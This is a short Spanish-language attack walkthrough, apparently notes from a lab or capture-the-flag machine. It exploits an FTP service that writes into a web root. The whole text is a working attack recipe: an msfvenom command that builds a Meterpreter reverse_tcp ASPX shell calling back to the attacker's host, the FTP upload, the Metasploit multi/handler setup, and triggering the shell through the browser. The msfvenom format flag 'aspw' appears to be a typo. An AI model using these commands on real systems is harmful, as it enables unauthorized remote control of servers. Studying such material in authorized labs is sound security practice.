Consiste en que el puerto 21 (ftp) está vinculado al puerto 80 por lo cual podemos subir un archivo malicioso con extensión.aspx que nos de acceso remoto de comandos.

creamos un archivo malicioso con msfvenom:
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<myip> LPORT=4444 -f aspw -o shell.aspx
```

Entramos al puerto ftp y subimos el archivo:
```
put shell.aspx
```

Hay que ponernos en escucha por metasploit. Una vez dentro de metasploit:
+ `use multi/handler`
+ `set LHOST <myIP>`
+ `set PAYLOAD windows/meterpreter/reverse_tcp`
+ `run`
Abrimos el navegador y ponemos: `<IP>/shell.aspx` volvemos al metasploit y ya estaríamos dentro :)